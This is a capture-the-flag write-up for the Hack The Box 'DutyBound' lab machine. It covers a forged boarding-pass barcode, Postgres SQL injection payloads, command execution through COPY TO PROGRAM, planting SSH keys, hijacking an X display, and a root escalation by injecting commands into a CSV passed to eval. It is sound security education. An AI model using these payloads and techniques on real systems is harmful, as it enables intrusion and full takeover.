---
layout: post
title: "DutyBound"
seo_title: "HackTheBox DutyBound Writeup: SQL Injection & Enumeration | Alex Schneider"
date: 2026-10-26 00:00:00 -0400
author: Alex Schneider
categories: [writeups]
tags: [hackthebox, linux, web, sql-injection, postgresql, x11, privesc]
permalink: /dutybound.html
description: "A Hack The Box DutyBound writeup covering Linux enumeration, boarding-pass parsing, PostgreSQL SQL injection, and privilege escalation."
---

DutyBound is a Hack The Box Linux machine built around a duty-free self-checkout kiosk. This one wasn't my favorite. The foothold hinged on finding a SQL injection, and working out the barcode format well enough to test for it was pretty painful.

## Enumeration

I started with a full port scan. I usually add `-v` so I can look at open ports before the scan finishes, which helped here: the web ports showed up early and I started on them while the rest ran.

```
$ sudo nmap -A -T4 -p- -Pn -v 10.129.20.157 -oA nmap/full
<snip>
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.18 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://airsnacks.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=airsnacks.htb
|_http-title: Welcome \xC2\xB7 AirSnacks Self-Checkout
<snip>
```

Three ports: SSH, and HTTP that redirects straight to HTTPS. The redirect and the certificate both pointed at `airsnacks.htb`, so I added it to `/etc/hosts`.

```
10.129.20.157 airsnacks.htb
```

The site is a self-checkout storefront. You browse products, add them to a cart, and check out. Nothing stood out on the first pass, so I ran feroxbuster for completeness.

```
$ feroxbuster --url https://airsnacks.htb --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt --insecure
<snip>
200      GET      154l      523w     8857c https://airsnacks.htb/static/app.css
200      GET       53l      193w     1801c https://airsnacks.htb/static/app.js
200      GET      388l      919w    12721c https://airsnacks.htb/browse
200      GET       43l      146w     1470c https://airsnacks.htb/
200      GET       38l       97w     1065c https://airsnacks.htb/cart
200      GET        1l        1w       16c https://airsnacks.htb/health
405      GET        5l       20w      153c https://airsnacks.htb/exit
```

What caught my eye wasn't in the fuzzing results. The checkout flow has a boarding-pass scanner, a little animated widget that asks you to place your barcode on the glass. I couldn't do anything with it through the UI.

[![The AirSnacks boarding-pass scanner widget, showing "No barcode detected."]({{ '/assets/images/dutybound/barcode-scanner.png' | relative_url }})]({{ '/assets/images/dutybound/barcode-scanner.png' | relative_url }})

*The scanner UI. There's no camera, so the scan has to be faked somewhere.*

Since there's no real scanner hardware, I read the page source to see what the button does.

```html
<div class="panel panel-narrow scan-panel">
  <h1>Scan your boarding pass</h1>
  <p class="scan-help">Place your boarding-pass barcode face-down on the scanner
    glass and press Scan. We read your destination to apply the correct duty/tax.</p>
  <snip>
  <div class="notice">
    <b>Customs &amp; VAT notice.</b> For export verification, your boarding-pass
    details are recorded in our sales audit log in accordance with HMRC
    requirements. <span class="ref">AirSnacks — VRS TravelPOS ref. VRS-3341</span>
  </div>
</div>

  <script src="/static/app.js"></script>
  <script>initScanner();</script>
```

`initScanner()` is the part I wanted. In `app.js`:

```javascript
function initScanner() {
  const btn = document.getElementById("scan-btn");
  <snip>
  btn.addEventListener("click", async function () {
    <snip>
    const pending = postJSON("/checkout/boarding-pass/verify", { raw: "" });
    await new Promise(function (r) { setTimeout(r, 1400); });
    try { await pending; } catch (e) {}
    <snip>
  });
```

So the button POSTs `{"raw": ""}` to `/checkout/boarding-pass/verify`, waits a fixed delay, and throws the result away. The UI always says "No barcode detected" no matter what comes back. That endpoint is the real attack surface, and the "sales audit log" line in the customs notice is a hint I came back to later.

I also fuzzed `/checkout` and `/cart`. `/checkout/pay` was an unfinished placeholder, and `/cart` had the expected `add`/`update`/`clear` handlers.

## Faking a Boarding Pass

A browser GET to the endpoint returns `405 Method Not Allowed` with `Allow: OPTIONS, POST`, which matches the JS. Switching to POST with an empty body gives the first real response:

<div class="reqres" markdown="1">
<div markdown="1">
<p class="reqres-label">Request</p>

```http
POST /checkout/boarding-pass/verify HTTP/1.1
Host: airsnacks.htb
Cookie: session=<snip>
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
</div>
<div markdown="1">
<p class="reqres-label">Response</p>

```http
HTTP/1.1 400 BAD REQUEST
Content-Type: application/json

{"detail":"expected 'M' at offset 0","error":"BCBP_ERR_FORMAT_CODE","item":1}
```
</div>
</div>

`expected 'M' at offset 0`. BCBP is the Bar Coded Boarding Pass format, the data encoded in the barcode on an airline boarding pass. It's standardized in [IATA Resolution 792](https://www.iata.org/en/programs/passenger/common-use/), and every pass starts with the format code `M`.

Before building one, I wanted to know where the empty request was getting its data. I sent no body, yet the server parsed something, so the input had to be coming from the session cookie. It's base64, so I decoded it in CyberChef.

[![The session cookie decoded from base64 in CyberChef, revealing the cart JSON.]({{ '/assets/images/dutybound/cookie-base64.png' | relative_url }})]({{ '/assets/images/dutybound/cookie-base64.png' | relative_url }})

*The cookie decodes to the cart contents. The trailing bytes are a Flask `itsdangerous` HMAC-SHA1 signature, so I can read the cookie but not forge one.*

That told me two things: the app is Flask with signed session cookies, and the boarding pass I send in `raw` is what gets parsed. Now I needed a valid `M` pass.

The parser is strict, and it answers each malformed field with a specific error. That turns it into a guided exercise: fix whatever it's complaining about, resend, read the next complaint. The mandatory section is fixed-width:

| Offset | Len | Field |
| --- | --- | --- |
| 0 | 1 | Format code (`M`) |
| 1 | 1 | Number of legs |
| 2 | 20 | Passenger name (`LAST/FIRST`, space-padded) |
| 22 | 1 | Electronic ticket indicator (`E`) |
| 23 | 7 | PNR code |
| 30 | 3 | From airport |
| 33 | 3 | To airport |
| 36 | 3 | Operating carrier |
| 39 | 5 | Flight number |
| 44 | 3 | Flight date (Julian day) |
| 47 | 1 | Compartment |
| 48 | 4 | Seat number |
| 52 | 5 | Check-in sequence |
| 57 | 1 | Passenger status |
| 58 | 2 | Size of conditional section (hex) |

Once the 58-character mandatory block was right, the error changed to `BCBP_ERR_CONDITIONAL_REQUIRED` on `item 6`. This is where the box stops following the real spec. In a standard pass, item 6 after the leg is a `>` version block; here the parser wanted uppercase hex. `00` meant "no conditional data" and kept the same error, while `FF` moved me on to `missing version marker '>'`. So the shape is a hex length byte, then `>`, then a version.

From there each attempt validated one more field:

- `FF>5` returned `supported versions: 5-8`
- then `item 10 must be one of 0B,18,25,32`, so I picked `0B`
- then `expected 'B' or blank`, a document type
- seven blank characters for an issue date returned `BP issuer is not the carrier or an interline partner`. I guessed the issuer had to match the leg's operating carrier, `BA`, and that passed
- `BA` immediately followed by hex brought the issuer error back, so I fuzzed delimiters. A space worked, and the error moved to `item 17 must be one of 03,0D,0E,0F,12,15,25,26,29,2A`, so I picked `03`
- HTTP 200

I was counting these out by hand at first, then wrote a small generator so I could change one field at a time without miscounting the padding:

```python
#!/usr/bin/env python3
def make_bcbp(
    name="DESMARAIS/LUC", frm="LHR", to="JFK",
    carrier="BA", pnr="ABC123", flight="0117",
    julian_date="325", compartment="Y", seat="024A",
    seq="0101", status="0",
    hex_blob="FF",      # item 6: length of the conditional section
    version="5",        # 5-8
    item10="0B",        # 0B | 18 | 25 | 32
    doc_type="B",       # 'B' or ' '
    issue_date="",      # "YYYYJJJ" or blank
    item17="03",        # 03 0D 0E 0F 12 15 25 26 29 2A
):
    leg = "%-7s%-3s%-3s%-3s%-5s%03d%-1s%-4s%-5s%-1s" % (
        pnr[:7], frm[:3], to[:3], carrier[:3].ljust(3),
        flight[:5], int(julian_date), compartment[:1],
        seat[:4], seq[:5], status[:1],
    )
    mandatory = "M1" + name[:20].ljust(20) + "E" + leg      # 58 chars
    conditional = (
        hex_blob.upper() + ">" + version + item10
        + (doc_type or " ")
        + (issue_date.ljust(7) if issue_date else " " * 7)
        + carrier[:3].strip().ljust(2)[:2] + " "            # issuer + delimiter
        + item17
    )
    return mandatory + conditional
```

The winning pass and its response:

<div class="reqres" markdown="1">
<div markdown="1">
<p class="reqres-label">Request</p>

```http
POST /checkout/boarding-pass/verify HTTP/1.1
Host: airsnacks.htb
Cookie: session=<snip>
Content-Type: application/json
Content-Length: 87

{"raw":"M1DESMARAIS/LUC       EABC123 LHRJFKBA 0117 325Y024A0101 0FF>50BB       BA 03"}
```
</div>
<div markdown="1">
<p class="reqres-label">Response</p>

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"audit_ref":"aud_1d654a5bf917",
 "dest":"JFK",
 "eligibility_token":"<snip>",
 "exempt":false,
 "regime":"OFF_AIRPORT"}
```
</div>
</div>

So I could mint an eligibility JWT. The trouble was I didn't know what consumed it. `/checkout/pay` was a dead end, and re-fuzzing for an endpoint that would take the token turned up nothing. The non-standard conditional section still bothered me, though, so I went back to it.

## SQL Injection in the Airline-Use Region

The conditional section was so far off the real spec that I kept picking at it. Here's the reasoning that got me to the bug.

First I worked out what the `FF` byte actually controls. I fuzzed its value from `0x00` to `0x20` with eight trailing characters, and the response flipped from 400 to 200 exactly at `0x19` (25 = 17 + 8), with the error `trailing data: last-leg item 6 declared 11, expected 19`. So `FF` declares the length of the whole conditional section, and anything past item 17 is a length-bounded airline-use region. Declare a length greater than or equal to what you send and it parses; declare less and you get a 400.

The parser swallows the first three characters of that region, which I found by sending a marker, so the working shape is `ABC` followed by the payload. The moment the payload contained a quote, the server returned a Postgres error:

```
HTTP 500 {"error":"DCS_ERR_INTERNAL","detail":"syntax error at or near \"1\"
LINE 1: ...BA', '0117', '325', 'LHR', 'JFK', '', '', 91, 'R '1'='1'--')"}
```

That's an `INSERT` into the sales audit log, the `bp_scan_audit` table from the customs notice, with the airline-use value concatenated straight into the `VALUES` list. No parameterization. I confirmed it in Burp with the `::int` cast trick: cast whatever you want to read to an integer, and Postgres hands you the value back in the error.

<div class="reqres" markdown="1">
<div markdown="1">
<p class="reqres-label">Request</p>

```http
POST /checkout/boarding-pass/verify HTTP/1.1
Host: airsnacks.htb
Cookie: session=<snip>
Content-Type: application/json
Content-Length: 122

{"raw":"M1DESMARAIS/LUC       EABC123 LHRJFKBA 0117 325Y024A0101 0FF>50BB       BA 03ABC'||(SELECT current_user)::int||'"}
```
</div>
<div markdown="1">
<p class="reqres-label">Response</p>

```http
HTTP/1.1 500 INTERNAL SERVER ERROR
Content-Type: application/json

{"detail":"invalid input syntax for type integer: \"airsnacks_app\"\n","error":"DCS_ERR_INTERNAL"}
```
</div>
</div>

sqlmap confirmed it too, as stacked queries:

```
$ sqlmap -u "https://airsnacks.htb/checkout/boarding-pass/verify" --method POST \
  -H "Content-Type: application/json" --cookie="session=<snip>" \
  --data='{"raw":"M1DESMARAIS/LUC       EABC123 LHRJFKBA 0117 325Y024A0101 0FF>50BB       BA 03ABC*"}' \
  -p raw --dbms=postgresql --technique=ETS --batch
<snip>
Parameter: JSON #1* ((custom) POST)
    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: ...0FF>50BB       BA 03ABC');SELECT PG_SLEEP(5)--
```

But dumping with it fell apart. Every time-based read threw `invalid character detected`, no matter how far it pushed the delay:

```
<snip>
[INFO] fetching number of databases
[WARNING] detected HTTP code '400' in validation phase is differing from expected '200'
[ERROR] invalid character detected. retrying..
[WARNING] increasing time delay to 2 seconds
[ERROR] invalid character detected. retrying..
```

Two things were working against it. The endpoint re-issues the session cookie on every verify, since eligibility state gets baked back into the cookie, so once sqlmap merged the server's cookie the responses stopped being consistent. And the `FF` length byte caps the section at 255 characters, so sqlmap's longer payloads get rejected by the BCBP parser before the SQL ever runs, which is where the 400s come from. Error-based wasn't going to auto-detect either, because sqlmap's payloads are `AND`-style `WHERE` vectors and we're inside an `INSERT ... VALUES` list.

So I did it by hand. The `::int` leak already worked from curl once I got the single-quote escaping right. A few reads to orient myself:

```
$ curl -sk -b /tmp/cj -X POST https://airsnacks.htb/checkout/boarding-pass/verify \
  -H 'Content-Type: application/json' \
  --data-raw '{"raw":"<snip>BA 03ABC'"'"'||(SELECT version())::int||'"'"'"}'
{"detail":"invalid input syntax for type integer: \"PostgreSQL 18.6 (Ubuntu 18.6-1.pgdg22.04+2) <snip>\"\n","error":"DCS_ERR_INTERNAL"}
```

`airsnacks_app` on database `airsnacks`, PostgreSQL 18.6. The read that mattered was the roles my DB user belongs to:

```
$ curl -sk -b /tmp/cj -X POST https://airsnacks.htb/checkout/boarding-pass/verify \
  -H 'Content-Type: application/json' \
  --data-raw '{"raw":"<snip>BA 03ABC'"'"'||(SELECT string_agg(roleid::regrole::text, chr(44)) FROM pg_auth_members WHERE member=(SELECT oid FROM pg_roles WHERE rolname=current_user))::int||'"'"'"}'
{"detail":"invalid input syntax for type integer: \"pg_execute_server_program\"\n","error":"DCS_ERR_INTERNAL"}
```

`pg_execute_server_program`. That role sticks in your memory from the Postgres docs because of what it allows: `COPY ... TO PROGRAM`, which runs an arbitrary OS command as the `postgres` system user.

## RCE via COPY TO PROGRAM

Because the injection is a stacked query, I could append a second statement. I checked execution with timing first. `true` returned instantly, `sleep 5` took five seconds:

```
$ curl -sk -o /dev/null -w 'time_total: %{time_total}s\n' -b /tmp/cj -X POST \
  https://airsnacks.htb/checkout/boarding-pass/verify -H 'Content-Type: application/json' \
  --data-raw '{"raw":"<snip>BA 03ABC'"'"'); COPY (SELECT '"'"''"'"') TO PROGRAM '"'"'sleep 5'"'"';--"}'
time_total: 5.140227s
```

Then a callback to a listener on my box, with the output sent over `/dev/tcp`:

```
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.98] from (UNKNOWN) [10.129.20.157] 49030
uid=114(postgres) gid=121(postgres) groups=121(postgres),120(ssl-cert)
dutyfree-kiosk7
```

One constraint to keep in mind: the `FF` length byte leaves about 238 characters for the payload after everything else, so there's no room for long one-liners. Short commands only.

That made a reverse shell fiddly, and I had an easier route anyway. I can run commands as `postgres`, so I staged my SSH key into `~postgres/.ssh/authorized_keys` across three short commands:

```
$ curl <snip> TO PROGRAM 'mkdir -p ~postgres/.ssh; chmod 700 ~postgres/.ssh' <snip>
$ curl <snip> TO PROGRAM 'echo ssh-ed25519 AAAAC3Nza<snip> kali@kali >> ~postgres/.ssh/authorized_keys' <snip>
$ curl <snip> TO PROGRAM 'chmod 600 ~postgres/.ssh/authorized_keys' <snip>
```

```
$ ssh -i ~/.ssh/id_ed25519 postgres@10.129.20.157
<snip>
postgres@dutyfree-kiosk7:~$ id
uid=114(postgres) gid=121(postgres) groups=121(postgres),120(ssl-cert)
```

A proper shell as `postgres`.

## Getting to the Kiosk User

This box runs an actual desktop session:

```
postgres@dutyfree-kiosk7:~$ ps aux | grep -iE 'kiosk|firefox|xinit|openbox' | grep -v grep
dutyfre+  1748  <snip>  xinit /home/dutyfree-kiosk/.xinitrc -- /usr/bin/X :0 vt7 -nolisten tcp -auth /tmp/serverauth.c7jDk9l4H2
dutyfre+  1760  <snip>  /usr/bin/openbox --startup /usr/lib/x86_64-linux-gnu/openbox-autostart OPENBOX
dutyfre+  1763  <snip>  firefox --kiosk https://airsnacks.htb
```

So `dutyfree-kiosk` runs `xinit`, openbox, and Firefox in kiosk mode on display `:0`. I also found the Flask app under `/opt/vrs/airsnacksdf/`, and a script at `/opt/vrs/bin/apply-duty-rates.sh` that does this on every CSV row:

```bash
eval "${tax_class}=${duty_pct}"
```

An `eval` on file input. I filed that away for once I had a way to write the file.

While I had the postgres account, peer authentication makes me a DB superuser locally, so I looked inside `htbairways`, the second database next to `airsnacks`:

```
postgres@dutyfree-kiosk7:~$ psql -c '\l'
    Name    |     Owner     | <snip>
 airsnacks  | airsnacks_app | <snip>
 htbairways | postgres      | <snip>
<snip>
```

Just flights and passenger data, nothing useful. I grabbed the SCRAM hashes for both login roles in case of password reuse, but they didn't crack.

From the `postgres` shell, I could connect to the existing X display on `:0`:

```
postgres@dutyfree-kiosk7:~$ export DISPLAY=:0
postgres@dutyfree-kiosk7:~$ xdpyinfo | head -4
name of display:    :0
version number:     11.0
vendor string:      The X.Org Foundation
<snip>
```

The kiosk's X server accepts connections from my service account. And openbox binds a hotkey to spawn a terminal:

```
postgres@dutyfree-kiosk7:~$ grep -n 'C-A-t' /etc/xdg/openbox/rc.xml
319:  <keybind key="C-A-t"><action name="Execute"><command>xterm</command></action></keybind>
```

I viewed the existing kiosk desktop and pressed Ctrl+Alt+T to open an xterm. Openbox was running as `dutyfree-kiosk`, so the terminal opened as that user. From there, I added my SSH key:

```sh
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo 'ssh-ed25519 AAAAC3Nza<snip> kali@kali' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

Then back in over SSH as the kiosk user:

```
$ ssh -i ~/.ssh/id_ed25519 dutyfree-kiosk@10.129.20.157
<snip>
dutyfree-kiosk@dutyfree-kiosk7:~$ id
uid=1000(dutyfree-kiosk) gid=1000(dutyfree-kiosk) groups=1000(dutyfree-kiosk),1001(pos-ops)
dutyfree-kiosk@dutyfree-kiosk7:~$ cat ~/user.txt
<redacted>
```

## Root: The Duty-Rate Eval

Back to that `eval`. `dutyfree-kiosk` is in the `pos-ops` group, and that group is what makes the last step work. A systemd path unit watches the duty-rates CSV:

```
$ cat /etc/systemd/system/vrs-duty-apply.path
[Path]
PathModified=/opt/vrs/data/duty-rates.csv
Unit=vrs-duty-apply.service
<snip>

$ cat /etc/systemd/system/vrs-duty-apply.service
[Service]
Type=oneshot
ExecStart=/opt/vrs/bin/apply-duty-rates.sh
<snip>
```

There's no `User=` in the service, so it runs as root. And the CSV it watches is group-writable by `pos-ops`:

```
$ getent group pos-ops
pos-ops:x:1001:dutyfree-kiosk
$ ls -la /opt/vrs/data/
<snip>
-rw-rw-r-- 1 root pos-ops 97 Oct 26 23:43 duty-rates.csv
```

Writing to the CSV triggers a root process that runs `eval "${tax_class}=${duty_pct}"` on the first field of every row.

The catch is `set -e`. A bare `$(...)` in the first field leaves a broken assignment like `=45`, and the script dies before it reaches the rows that define the required categories. An array subscript keeps the line a valid assignment while still running the command: `x[$(...)]=45` executes and assigns cleanly. I put two payload rows on top and kept the original rows below so the later `SPIRITS`/`WINE` checks still pass:

```
dutyfree-kiosk@dutyfree-kiosk7:~$ cp /opt/vrs/data/duty-rates.csv /tmp/duty-rates.bak
dutyfree-kiosk@dutyfree-kiosk7:~$ printf '%s\n' \
  'x[$(cp /bin/bash /tmp/rootbash; chmod 6755 /tmp/rootbash)],45,20' \
  'x[$(id > /tmp/rootid)],45,20' | cat - /tmp/duty-rates.bak > /opt/vrs/data/duty-rates.csv
dutyfree-kiosk@dutyfree-kiosk7:~$ sleep 6
dutyfree-kiosk@dutyfree-kiosk7:~$ ls -la /tmp/rootbash
-rwsr-sr-x 1 root root 1396520 Oct 26 23:54 /tmp/rootbash
```

A root-owned SUID bash. From there:

```
dutyfree-kiosk@dutyfree-kiosk7:~$ /tmp/rootbash -p -c id
uid=1000(dutyfree-kiosk) gid=1000(dutyfree-kiosk) euid=0(root) egid=0(root) groups=0(root),<snip>
dutyfree-kiosk@dutyfree-kiosk7:~$ /tmp/rootbash -p -c 'cat /root/root.txt'
<redacted>
```
